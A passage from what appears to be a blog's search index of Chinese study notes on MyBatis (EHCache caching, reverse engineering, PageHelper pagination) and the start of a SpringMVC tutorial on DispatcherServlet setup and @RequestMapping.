-->\n<dependency>\n\t<groupId>org.mybatis.caches</groupId>\n\t<artifactId>mybatis-ehcache</artifactId>\n\t<version>1.2.1</version>\n</dependency>\n<!-- slf4j日志门面的一个具体实现 -->\n<dependency>\n\t<groupId>ch.qos.logback</groupId>\n\t<artifactId>logback-classic</artifactId>\n\t<version>1.2.3</version>\n</dependency>\n```\n\n#### b.创建EHCache的配置文件ehcache.xml\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<ehcache xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:noNamespaceSchemaLocation=\"../config/ehcache.xsd\">\n    <!-- 磁盘保存路径 -->\n    <diskStore path=\"/Users/jianjian/ehcache\"/>\n    <defaultCache\n            maxElementsInMemory=\"1000\"\n            maxElementsOnDisk=\"10000000\"\n            eternal=\"false\"\n            overflowToDisk=\"true\"\n            timeToIdleSeconds=\"120\"\n            timeToLiveSeconds=\"120\"\n            diskExpiryThreadIntervalSeconds=\"120\"\n            memoryStoreEvictionPolicy=\"LRU\">\n    </defaultCache>\n</ehcache>\n```\n\nEHCache配置文件说明\n\n| 属性名                          | 是否必须 | 作用                                                         |\n| ------------------------------- | -------- | ------------------------------------------------------------ |\n| maxElementsInMemory             | 是       | 在内存中缓存的element的最大数目                              |\n| maxElementsOnDisk               | 是       | 在磁盘上缓存的element的最大数目，若是0表示无穷大             |\n| eternal                         | 是       | 设定缓存的elements是否永远不过期。 如果为true，则缓存的数据始终有效， 如果为false那么还要根据timeToIdleSeconds、timeToLiveSeconds判断 |\n| overflowToDisk                  | 是       | 设定当内存缓存溢出的时候是否将过期的element缓存到磁盘上      |\n| timeToIdleSeconds               | 否       | 当缓存在EhCache中的数据前后两次访问的时间超过timeToIdleSeconds的属性取值时， 这些数据便会删除，默认值是0,也就是可闲置时间无穷大 |\n| timeToLiveSeconds               | 否       | 缓存element的有效生命期，默认是0.,也就是element存活时间无穷大 |\n| diskSpoolBufferSizeMB           | 否       | DiskStore(磁盘缓存)的缓存区大小。默认是30MB。每个Cache都应该有自己的一个缓冲区 |\n| diskPersistent                  | 否       | 在VM重启的时候是否启用磁盘保存EhCache中的数据，默认是false   |\n| diskExpiryThreadIntervalSeconds | 否       | 磁盘缓存的清理线程运行间隔，默认是120秒。每个120s， 相应的线程会进行一次EhCache中数据的清理工作 |\n| memoryStoreEvictionPolicy       | 否       | 当内存缓存达到最大，有新的element加入的时候， 移除缓存中element的策略。 默认是LRU（最近最少使用），可选的有LFU（最不常使用）和FIFO（先进先出 |\n\n#### c.设置二级缓存的类型\n\n在xxxMapper.xml文件中设置二级缓存类型\n\n```xml\n<cache type=\"org.mybatis.caches.ehcache.EhcacheCache\"/>\n```\n\n#### d.加入logback日志\n\n存在SLF4J时，作为简易日志的log4j将失效，此时我们需要借助SLF4J的具体实现logback来打印日志。创建logback的配置文件`logback.xml`，名字固定，不可改变\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration debug=\"true\">\n    <!-- 指定日志输出的位置 -->\n    <appender name=\"STDOUT\"\n              class=\"ch.qos.logback.core.ConsoleAppender\">\n        <encoder>\n            <!-- 日志输出的格式 -->\n            <!-- 按照顺序分别是：时间、日志级别、线程名称、打印日志的类、日志主体内容、换行 -->\n            <pattern>[%d{HH:mm:ss.SSS}] [%-5level] [%thread] [%logger] [%msg]%n</pattern>\n        </encoder>\n    </appender>\n    <!-- 设置全局日志级别。日志级别按顺序分别是：DEBUG、INFO、WARN、ERROR -->\n    <!-- 指定任何一个日志级别都只打印当前级别和后面级别的日志。 -->\n    <root level=\"DEBUG\">\n        <!-- 指定打印日志的appender，这里通过“STDOUT”引用了前面配置的appender -->\n        <appender-ref ref=\"STDOUT\" />\n    </root>\n    <!-- 根据特殊需求指定局部日志级别 -->\n    <logger name=\"com.jianjian.mapper\" level=\"DEBUG\"/>\n</configuration>\n```\n\n## 十一、MyBatis的逆向工程\n\n- 正向工程：先创建Java实体类，由框架负责根据实体类生成数据库表。Hibernate是支持正向工程的\n- 逆向工程：先创建数据库表，由框架负责根据数据库表，反向生成如下资源：  \n  - Java实体类  \n  - Mapper接口  \n  - Mapper映射文件\n\n### 1.构建逆向工程\n\n####  a.添加依赖和插件         \n\n```xml\n   <dependencies>\n        <!-- MyBatis核心依赖包 -->\n        <dependency>\n            <groupId>org.mybatis</groupId>\n            <artifactId>mybatis</artifactId>\n            <version>3.5.9</version>\n        </dependency>\n        <!-- junit测试 -->\n        <dependency>\n            <groupId>junit</groupId>\n            <artifactId>junit</artifactId>\n            <version>4.13.2</version>\n            <scope>test</scope>\n        </dependency>\n        <!-- MySQL驱动 -->\n        <dependency>\n            <groupId>mysql</groupId>\n            <artifactId>mysql-connector-java</artifactId>\n            <version>8.0.29</version>\n        </dependency>\n        <!-- log4j日志 -->\n        <dependency>\n            <groupId>log4j</groupId>\n            <artifactId>log4j</artifactId>\n            <version>1.2.17</version>\n        </dependency>\n    </dependencies>\n    <!-- 控制Maven在构建过程中相关配置 -->\n    <build>\n        <!-- 构建过程中用到的插件 -->\n        <plugins>\n            <!-- 具体插件，逆向工程的操作是以构建过程中插件形式出现的 -->\n            <plugin>\n                <groupId>org.mybatis.generator</groupId>\n                <artifactId>mybatis-generator-maven-plugin</artifactId>\n                <version>1.3.0</version>\n                <!-- 插件的依赖 -->\n                <dependencies>\n                    <!-- 逆向工程的核心依赖 -->\n                    <dependency>\n                        <groupId>org.mybatis.generator</groupId>\n                        <artifactId>mybatis-generator-core</artifactId>\n                        <version>1.3.2</version>\n                    </dependency>\n                    <!-- 数据库连接池 -->\n                    <dependency>\n                        <groupId>com.mchange</groupId>\n                        <artifactId>c3p0</artifactId>\n                        <version>0.9.5.5</version>\n                    </dependency>\n                    <!-- MySQL驱动 -->\n                    <dependency>\n                        <groupId>mysql</groupId>\n                        <artifactId>mysql-connector-java</artifactId>\n                        <version>8.0.29</version>\n                    </dependency>\n                </dependencies>\n            </plugin>\n        </plugins>\n    </build>\n```\n\n#### b.创建MyBatis的核心配置文件\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n    <!--引入properties-->\n    <properties resource=\"jdbc.properties\"></properties>\n    <settings>\n        <!--将表中字段的下划线自动转换为驼峰-->\n        <setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n        <!--开启延迟加载-->\n        <setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n    </settings>\n    <!--设置别名-->\n    <typeAliases>\n        <package name=\"com.xxx.pojo\"/>\n    </typeAliases>\n    <!--设置连接数据库的环境-->\n    <environments default=\"development\">\n        <environment id=\"development\">\n            <transactionManager type=\"JDBC\"/>\n            <dataSource type=\"POOLED\">\n                <property name=\"driver\" value=\"${jdbc.driver}\"/>\n                <property name=\"url\" value=\"${jdbc.url}\"/>\n                <property name=\"username\" value=\"${jdbc.username}\"/>\n                <property name=\"password\" value=\"${jdbc.password}\"/>\n            </dataSource>\n        </environment>\n    </environments>\n    <!--引入映射文件-->\n    <mappers>\n        <package name=\"com.xxx.mapper\"/>\n    </mappers>\n</configuration>\n```\n\njdbc.properties\n\n```properties\njdbc.driver=com.mysql.cj.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/Mybatis\njdbc.username=root\njdbc.password=root\n```\n\n#### c.创建逆向工程的配置文件\n\n文件名必须是：`generatorConfig.xml`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE generatorConfiguration\n        PUBLIC \"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\">\n<generatorConfiguration>\n    <!--\n    targetRuntime: 执行生成的逆向工程的版本\n    MyBatis3Simple: 生成基本的CRUD（清新简洁版）\n    MyBatis3: 生成带条件的CRUD（奢华尊享版）\n    -->\n    <context id=\"DB2Tables\" targetRuntime=\"MyBatis3Simple\">\n        <!-- 数据库的连接信息 -->\n        <jdbcConnection driverClass=\"com.mysql.cj.jdbc.Driver\"\n                        connectionURL=\"jdbc:mysql://localhost:3306/Mybatis\"\n                        userId=\"root\"\n                        password=\"root\">\n        </jdbcConnection>\n        <!-- javaBean的生成策略-->\n        <javaModelGenerator targetPackage=\"com.jianjian.pojo\"\n                            targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n            <property name=\"trimStrings\" value=\"true\" />\n        </javaModelGenerator>\n        <!-- SQL映射文件的生成策略 -->\n        <sqlMapGenerator targetPackage=\"com.jianjian.mapper\"\n                         targetProject=\"./src/main/resources\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </sqlMapGenerator>\n        <!-- Mapper接口的生成策略 -->\n        <javaClientGenerator type=\"XMLMAPPER\"\n                             targetPackage=\"com.jianjian.mapper\"\n                             targetProject=\"./src/main/java\">\n            <property name=\"enableSubPackages\" value=\"true\" />\n        </javaClientGenerator>\n        <!-- 逆向分析的表 -->\n        <!-- tableName设置为*号，可以对应所有表，此时不写domainObjectName -->\n        <!-- domainObjectName属性指定生成出来的实体类的类名 -->\n        <table tableName=\"t_emp\" domainObjectName=\"Emp\"/>\n        <table tableName=\"t_dept\" domainObjectName=\"Dept\"/>\n    </context>\n</generatorConfiguration>\n```\n\n#### d.执行MBG插件的generate目标\n\n双击运行\n\n![](https://img.jwt1399.top/img/202205262019216.png)\n\n运行结果\n\n![](https://img.jwt1399.top/img/202205262019231.png)\n\n生成的实体类需要手动添加构造器、toString方法\n\n一般使用奢华尊享版，即 targetRuntime设置为MyBatis3\n\n### 2.QBC查询\n\nQBC 即 Quary By Criteria，在sql语句相当于查询条件。QBC查询是将查询条件通过Java对象进行模块化封装。\n\n- `selectByExample`：按条件查询，需要传入一个example对象或者null；如果传入一个null，则表示没有条件，也就是查询所有数据\n- `example.createCriteria().xxx`：创建条件对象，通过andXXX方法为SQL添加查询添加，每个条件之间是and关系\n- `example.or().xxx`：将之前添加的条件通过or拼接其他条件\n\n```java\n@Test\npublic void testMBG() throws IOException {\n  InputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n  SqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n  SqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n  SqlSession sqlSession = sqlSessionFactory.openSession(true);\n  EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\n  EmpExample example = new EmpExample();\n  //名字为张三，且年龄大于等于20\n  example.createCriteria().andEmpNameEqualTo(\"张三\").andAgeGreaterThanOrEqualTo(20);\n  //或者did不为空\n  example.or().andDidIsNotNull();\n\n  List<Emp> emps = mapper.selectByExample(example);\n  emps.forEach(System.out::println);\n}\n```\n\n### 3.QBC增改\n\n- `updateByPrimaryKey`：通过主键进行数据修改，如果某一个值为null，也会将对应的字段改为null\n\n`mapper.updateByPrimaryKey(new Emp(1,\"admin\",22,null,\"456@qq.com\",3));`\n\n![](https://img.jwt1399.top/img/202205262040444.png)\n\n- `updateByPrimaryKeySelective()`：通过主键进行选择性数据修改，如果某个值为null，则不修改这个字段\n\n`mapper.updateByPrimaryKeySelective(new Emp(2,\"admin2\",22,null,\"456@qq.com\",3));`\n\n![](https://img.jwt1399.top/img/202205262040097.png)\n\n## 十二、分页插件\n\n### 1.配置\n\n#### a.添加依赖\n\n```xml\n<!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper -->\n<dependency>\n\t<groupId>com.github.pagehelper</groupId>\n\t<artifactId>pagehelper</artifactId>\n\t<version>5.2.0</version>\n</dependency>\n```\n\n#### b.配置分页插件\n\n在MyBatis的核心配置文件（mybatis-config.xml）中配置插件\n\n```xml\n<plugins>\n\t<!--设置分页插件-->\n\t<plugin interceptor=\"com.github.pagehelper.PageInterceptor\"></plugin>\n</plugins>\n```\n\n### 2.使用\n\n在查询功能之前使用`PageHelper.startPage(int pageNum, int pageSize)`开启分页功能\n\n- pageNum：当前页的页码  \n- pageSize：每页显示的条数\n\n#### a.直接输出\n\n```java\n@Test\npublic void testPageHelper() throws IOException {\n\tInputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n\tSqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n\tSqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n\tSqlSession sqlSession = sqlSessionFactory.openSession(true);\n\tEmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\t//访问第一页，每页四条数据\n\tPage<Object> page = PageHelper.startPage(1, 4);\n\tList<Emp> emps = mapper.selectByExample(null);\n\t//在查询到List集合后，打印分页数据\n\tSystem.out.println(page);\n}\n```\n\n- 分页相关数据：\n\n```java\nPage{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false}[Emp{eid=1, empName='admin', age=22, sex='男', email='456@qq.com', did=3}, Emp{eid=2, empName='admin2', age=22, sex='男', email='456@qq.com', did=3}, Emp{eid=3, empName='王五', age=12, sex='女', email='123@qq.com', did=3}, Emp{eid=4, empName='赵六', age=32, sex='男', email='123@qq.com', did=1}]\n```\n\n#### b.使用PageInfo\n\n在查询获取list集合之后，使用`PageInfo<T> pageInfo = new PageInfo<>(List<T> list, intnavigatePages)`获取分页相关数据\n\n```java\n@Test\npublic void testPageHelper() throws IOException {\n\tInputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n\tSqlSessionFactoryBuilder sqlSessionFactoryBuilder = new SqlSessionFactoryBuilder();\n\tSqlSessionFactory sqlSessionFactory = sqlSessionFactoryBuilder.build(is);\n\tSqlSession sqlSession = sqlSessionFactory.openSession(true);\n\tEmpMapper mapper = sqlSession.getMapper(EmpMapper.class);\n\tPageHelper.startPage(1, 4);\n\tList<Emp> emps = mapper.selectByExample(null);\n\tPageInfo<Emp> page = new PageInfo<>(emps,5);\n\tSystem.out.println(page);\n}\n```\n\n- 分页相关数据：\n\n```java\nPageInfo{\npageNum=1, pageSize=4, size=4, startRow=1, endRow=4, total=8, pages=2, \nlist=Page{count=true, pageNum=1, pageSize=4, startRow=0, endRow=4, total=8, pages=2, reasonable=false, pageSizeZero=false}[Emp{eid=1, empName='admin', age=22, sex='男', email='456@qq.com', did=3}, Emp{eid=2, empName='admin2', age=22, sex='男', email='456@qq.com', did=3}, Emp{eid=3, empName='王五', age=12, sex='女', email='123@qq.com', did=3}, Emp{eid=4, empName='赵六', age=32, sex='男', email='123@qq.com', did=1}], \nprePage=0, nextPage=2, isFirstPage=true, isLastPage=false, hasPreviousPage=false, hasNextPage=true, navigatePages=5, navigateFirstPage=1, navigateLastPage=2, navigatepageNums=[1, 2]}\n```\n\n- list：分页之后的数据  \n- navigatePages：导航分页的页码数\n- 其中list中的数据等同于方法a中直接输出的page数据\n\n### 3.常用数据\n\n- pageNum：当前页的页码  \n- pageSize：每页显示的条数  \n- size：当前页显示的真实条数  \n- total：总记录数  \n- pages：总页数  \n- prePage：上一页的页码  \n- nextPage：下一页的页码\n- isFirstPage/isLastPage：是否为第一页/最后一页  \n- hasPreviousPage/hasNextPage：是否存在上一页/下一页  \n- navigatePages：导航分页的页码数  \n- navigatepageNums：导航分页的页码，\\[1,2,3,4,5]\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MyBatis"],"categories":["SQL"]},{"title":"SpringMVC","url":"/posts/4780.html","content":"\n今天开始学习我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《SpringMVC》，小简从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 📝学习资料：[尚硅谷-SpringMVC教程](https://www.bilibili.com/video/BV1Ry4y1574R/)\n- [x] 🚩时间安排：预计7天更新完\n- [x] 🎯开始时间：05-07\n- [x] 🎉结束时间：05-20\n- [x] 🍀总结：没有按时完成目标，这段时间状态很不好，中间颓废了接近一周，又花了一些时间看论文，严重超时，但实际用时大概7天，接下来慢慢调整自己吧，希望快点找回高效的状态。本笔记是根据尚硅谷SpringMVC课程提供笔记进行整理\n\n## 一、SpringMVC简介\n\n### 1、什么是MVC\n\nMVC 是一种软件架构的思想，将软件按照数据模型层(**M**odel)、视图层(**V**iew)、控制层(**C**ontroller)来划分，使用 MVC 的目的是将 M 和 V 实现代码分离。\n\n- M：模型层，指工程中的 JavaBean，作用是处理数据\n\n  - JavaBean分为两类：\n\n    - 一类称为实体类Bean：专门存储业务数据的，如 Student、User 等\n\n    - 一类称为业务处理 Bean：指 Service 或 Dao 对象，专门用于处理业务逻辑和数据访问\n\n\n- V：视图层，指工程中的html或jsp等页面，作用是与用户进行交互，展示数据\n\n- C：控制层，指工程中的servlet，作用是接收请求和响应浏览器\n\n**MVC的工作流程：**\n\n用户通过 View 发送请求到服务器，在服务器中请求被 Controller 接收，Controller 调用相应的 Model 处理请求，处理完毕将结果返回到 Controller，Controller 再根据请求处理的结果找到相应的 View ，渲染数据后最终响应给浏览器\n\n### 2、什么是SpringMVC\n\nSpring MVC 是 Spring 提供的一个基于 MVC 设计模式的轻量级 Web 开发框架，本质上相当于 Servlet。\n\n**SpringMVC的特点**\n\n- **Spring 家族原生产品**，与 IOC 容器等基础设施无缝对接\n- **基于原生的Servlet**，通过了功能强大的**前端控制器DispatcherServlet**，对请求和响应进行统一处理\n- **清晰地角色划分**，在 Model、View 和 Controller 方面提供了一个非常清晰的角色划分，这 3 个方面真正是各司其职，各负其责。\n- **代码清新简洁**，大幅度提升开发效率\n- 内部组件化程度高，可插拔式组件**即插即用**，想要什么功能配置相应组件即可\n- **性能卓著**，尤其适合现代大型、超大型互联网项目要求\n\n## 二、快速入门\n\n1. 创建 Web 应用\n2. 引入依赖\n3. Spring MVC 配置\n4. 创建 Controller\n5. 创建 View\n6. 部署运行\n\n### 1、创建 Web 项目\n\n- 打开 IDEA，选择 Java Enterprise\n- 模版选择 Web 应用程序\n- 应用程序服务器选择 Tomcat\n- 构建系统选择 Maven\n- 依赖项勾选 Servlet 和 Thymeleaf\n- 删除掉 index.jsp\n\n### 2、引入依赖\n\n```xml\n<dependencies>\n    <!-- SpringMVC -->\n    <dependency>\n        <groupId>org.springframework</groupId>\n        <artifactId>spring-webmvc</artifactId>\n        <version>5.3.1</version>\n    </dependency>\n\n    <!-- 日志 -->\n    <dependency>\n        <groupId>ch.qos.logback</groupId>\n        <artifactId>logback-classic</artifactId>\n        <version>1.2.3</version>\n    </dependency>\n\n    <!-- Spring5和Thymeleaf整合包 -->\n    <dependency>\n        <groupId>org.thymeleaf</groupId>\n        <artifactId>thymeleaf-spring5</artifactId>\n        <version>3.0.12.RELEASE</version>\n    </dependency>\n</dependencies>\n```\n\n### 3、Spring MVC 配置\n\nSpring MVC 是基于 Servlet 的，DispatcherServlet 是整个 Spring MVC 框架的核心，主要负责截获请求并将其分派给相应的处理器处理。所以配置 Spring MVC，首先要定义 DispatcherServlet。跟所有 Servlet 一样，用户必须在 **web.xml** 中进行配置。\n\n#### 3.1 定义DispatcherServlet\n\n##### a>默认配置方式\n\nSpring MVC 初始化时将在应用程序的 WEB-INF 目录下查找配置文件，该配置文件的命名规则是“\\<servlet-name>-servlet.xml”\n\n例如，以下配置所对应SpringMVC的配置文件位于WEB-INF下，文件名为springMVC-servlet.xml\n\n```xml\n<!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 -->\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    <!--\n        设置springMVC的核心控制器所能处理的请求的请求路径\n        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径\n        但是/不能匹配.jsp请求路径的请求\n    -->\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n```\n\n##### b>扩展配置方式(推荐)\n\n也可以将 Spring MVC 的配置文件存放在应用程序目录中的任何地方，但需要使用 servlet 的 init-param 元素加载配置文件，通过 contextConfigLocation 参数来指定 Spring MVC 配置文件的位置\n\n```xml\n<!-- 配置SpringMVC的前端控制器，对浏览器发送的请求统一进行处理 -->\n<servlet>\n    <servlet-name>springMVC</servlet-name>\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n    <!-- 通过初始化参数指定SpringMVC配置文件的位置和名称 -->\n    <init-param>\n        <!-- contextConfigLocation为固定值 -->\n        <param-name>contextConfigLocation</param-name>\n        <!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources -->\n        <param-value>classpath:springMVC.xml</param-value>\n    </init-param>\n    <!-- \n \t\t作为框架的核心组件，在启动过程中有大量的初始化操作要做\n\t\t而这些操作放在第一次请求时才执行会严重影响访问速度\n\t\t因此需要通过此标签将启动控制DispatcherServlet的初始化时间提前到服务器启动时\n\t-->\n    <load-on-startup>1</load-on-startup><!-- 表示容器再启动时立即加载servlet -->\n</servlet>\n<servlet-mapping>\n    <servlet-name>springMVC</servlet-name>\n    <!--\n        设置springMVC的核心控制器所能处理的请求的请求路径\n        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径\n        但是/不能匹配.jsp请求路径的请求\n    -->\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n```\n\n上述代码配置了一个名为“springMVC”的 Servlet。该 Servlet 是 DispatcherServlet 类型，它就是 Spring MVC 的入口，并通过 `<load-on-startup>1</load-on-startup>` 配置标记容器在启动时就加载此 DispatcherServlet，即自动启动。然后通过 servlet-mapping 映射到“/”，即 DispatcherServlet 需要截获并处理该项目的所有 URL 请求。\n\n#### 3.2 创建Spring MVC配置文件\n\n在 resources 目录下创建 springMVC.xml 文件，如下所示。\n\n```xml\n<!-- 自动扫描包 -->\n<context:component-scan base-package=\"com.jwt.mvc.controller\"/>\n\n<!-- 配置Thymeleaf视图解析器 -->\n<bean id=\"viewResolver\" class=\"org.thymeleaf.spring5.view.ThymeleafViewResolver\">\n    <property name=\"order\" value=\"1\"/>\n    <property name=\"characterEncoding\" value=\"UTF-8\"/>\n    <property name=\"templateEngine\">\n        <bean class=\"org.thymeleaf.spring5.SpringTemplateEngine\">\n            <property name=\"templateResolver\">\n                <bean class=\"org.thymeleaf.spring5.templateresolver.SpringResourceTemplateResolver\">\n    \n                    <!-- 视图前缀 -->\n                    <property name=\"prefix\" value=\"/WEB-INF/templates/\"/>\n    \n                    <!-- 视图后缀 -->\n                    <property name=\"suffix\" value=\".html\"/>\n                    <property name=\"templateMode\" value=\"HTML5\"/>\n                    <property name=\"characterEncoding\" value=\"UTF-8\" />\n                </bean>\n            </property>\n        </bean>\n    </property>\n</bean>\n\n<!-- \n   处理静态资源，例如html、js、css、jpg\n  若只设置该标签，则只能访问静态资源，其他请求则无法访问\n  此时必须设置<mvc:annotation-driven/>解决问题\n -->\n<mvc:default-servlet-handler/>\n\n<!-- 开启mvc注解驱动 -->\n<mvc:annotation-driven>\n    <mvc:message-converters>\n        <!-- 处理响应中文内容乱码 -->\n        <bean class=\"org.springframework.http.converter.StringHttpMessageConverter\">\n            <property name=\"defaultCharset\" value=\"UTF-8\" />\n            <property name=\"supportedMediaTypes\">\n                <list>\n                    <value>text/html</value>\n                    <value>application/json</value>\n                </list>\n            </property>\n        </bean>\n    </mvc:message-converters>\n</mvc:annotation-driven>\n```\n\n### 4、创建 Controller\n\n由于前端控制器对浏览器发送的请求进行了统一的处理，但是具体的请求有不同的处理过程，因此需要创建处理具体请求的类，即请求控制器。请求控制器中每一个处理请求的方法成为控制器方法\n\n因为 SpringMVC 的控制器由一个 POJO（普通的Java类）担任，因此需要通过 @Controller 注解将其标识为一个控制层组件，交给 Spring 的 IoC 容器管理，此时 SpringMVC 才能够识别控制器的存在\n\n```java\n//创建请求控制器\n@Controller\npublic class HelloController {\n  \n    // @RequestMapping注解：处理请求和控制器方法之间的映射关系\n    // localhost:8080/springMVC/\n    @RequestMapping(\"/\")\n    public String index() {//控制器方法\n        //设置视图名称\n        return \"index\";\n    }\n}\n```\n\n### 5、创建 View\n\n根据上面设置的视图前后缀，在 WEB-INF 下新建 templates 文件夹，在该文件夹下新建 index.html，并添加 Thymeleaf 命名空间 `xmlns:th=\"http://www.thymeleaf.org\"`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n  <meta charset=\"UTF-8\">\n  <title>首页</title>\n</head>\n<body>\n<h1>首页</h1>\n<h2>Hello World</h2>\n</body>\n</html>\n```\n\n### 6、部署运行\n\n将项目部署到 Tomcat 服务器，点击运行\n\n注：URL 路径要和部署里面的应用程序上下文一致\n\n| Tomcat配置                                                   | 运行效果                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](https://img.jwt1399.top/img/image-20220425230553885.png) | ![](https://img.jwt1399.top/img/image-20220425230438186.png) |\n\n### 7、总结\n\n- 1、浏览器发送请求，若请求地址符合前端控制器的 url-pattern，该请求就会被前端控制器DispatcherServlet 处理。\n\n- 2、前端控制器会读取 SpringMVC 的核心配置文件，通过扫描组件找到控制器，将请求地址和控制器中 @RequestMapping 注解的 value 属性值进行匹配，若匹配成功，该注解所标识的控制器方法就是处理请求的方法。\n\n- 3、处理请求的方法需要返回一个字符串类型的视图名称，该视图名称会被视图解析器解析，加上前缀和后缀组成视图的路径，通过 Thymeleaf 对视图进行渲染，最终转发到视图所对应页面。\n\n## 三、@RequestMapping注解\n\n> @RequestMapping注解的作用就是将请求和处理请求的控制器方法关联起来，建立映射关系。SpringMVC 接收到指定的请求，就会来找到在映射关系中对应的控制器方法来处理这个请求。\n\n### 1、注解位置\n\n- @RequestMapping放在类上：设置映射请求的请求路径的初始信息\n\n- @RequestMapping放在方法上：设置映射请求请求路径的具体信息\n\n```java\n@Controller\n@RequestMapping(\"/test\")\npublic class RequestMappingController {\n    @RequestMapping(\"/testRequestMapping\")\n    public String testRequestMapping(){\n        return \"success\";\n    }\n}\n```\n\n此时请求映射所映射的请求的请求路径为：/test/testRequestMapping\n\n### 2、value属性\n\n- @RequestMapping注解的value属性通过请求的**请求地址**匹配请求映射\n\n- value属性是一个字符串类型的数组，表示该请求映射能够匹配多个请求地址所对应的请求，value属性必须设置\n\n```html\n<a th:href=\"@{/test1}\">测试value属性-->/test1</a>\n<br>\n<a th:href=\"@{/test2}\">测试value属性-->/test2</a><br>\n```\n\n```java\n@RequestMapping(value = {\"/test1\", \"/test2\"})\npublic String testRequestMapping(){\n    return \"success\";\n}\n```\n\n### 3、method属性\n\n- @RequestMapping注解的method属性通过请求的**请求方式**（get或post）匹配请求映射\n\n- method属性是一个RequestMethod类型的数组，表示该请求映射能够匹配多种请求方式的请求\n- 若当前请求的请求地址满足请求映射的value属性，但是请求方式不满足method属性，则浏览器报错405：Request method 'POST' not supported\n\n```html\n<a th:href=\"@{/test}\">测试value属性</a>\n<br>\n<form th:action=\"@{/test}\" method=\"post\">\n    <input type=\"submit\">\n</form>\n```\n\n```java\n@RequestMapping(\n        value = {\"/test\"},\n        method = {RequestMethod.GET, RequestMethod.POST}\n)\npublic String testRequestMapping(){\n    return \"success\";\n}\n```\n\n对于处理指定请求方式的控制器方法，SpringMVC中提供了@RequestMapping的派生注解\n\n- 处理get请求的映射-->@GetMapping\n\n- 处理post请求的映射-->@PostMapping\n\n- 处理put请求的映射-->@PutMapping\n\n- 处理delete请求的映射-->@DeleteMapping\n\n```html\n<form th:action=\"@{/test}\" method=\"post\">\n    <input type=\"submit\">\n</form>\n```\n\n```java\n@PostMapping(\"/test\")\npublic String testRequestMapping(){\n\treturn \"success\";\n}\n```\n\n### 4、params属性\n\n- @RequestMapping注解的params属性通过请求的**请求参数**匹配请求映射\n\n- params属性是一个字符串类型的数组，可以通过四种表达式设置请求参数和请求映射的匹配关系\n\n  - \"param\"：要求请求映射所匹配的请求必须携带param请求参数\n\n  - \"!param\"：要求请求映射所匹配的请求不能携带param请求参数\n  - \"param=value\"：要求请求映射所匹配的请求必须携带param请求参数且param=value\n\n  - \"param!=value\"：要求请求映射所匹配的请求必须携带param请求参数但是param!=value\n\n- 若当前请求满足value和method属性，但是不满足params属性，此时页面回报错400：Parameter conditions \"username, password!=123456\" not met for actual request parameters: username={admin}, password={123456}\n\n```html\n<a th:href=\"@{/test(username='admin',password=123)}\">测试params属性</a>\n<!--或者-->\n<a th:href=\"@{/test?username=admin&password=123}\">测试params属性</a>\n```\n\n```java\n@RequestMapping(\n  value = {\"/testRequestMapping\", \"/test\"},\n  method = {RequestMethod.GET, RequestMethod.POST},\n  params = {\"username\",\"password!=123456\"}\n)\npublic String testRequestMapping(){\n  return \"success\";\n}\n```\n\n### 5、headers属性\n\n- @RequestMapping注解的headers属性通过请求的**请求头信息**匹配请求映射\n\n- headers属性是一个字符串类型的数组，可以通过四种表达式设置请求头信息和请求映射的匹配关系\n\n  - \"header\"：要求请求映射所匹配的请求必须携带header请求头信息\n\n  - 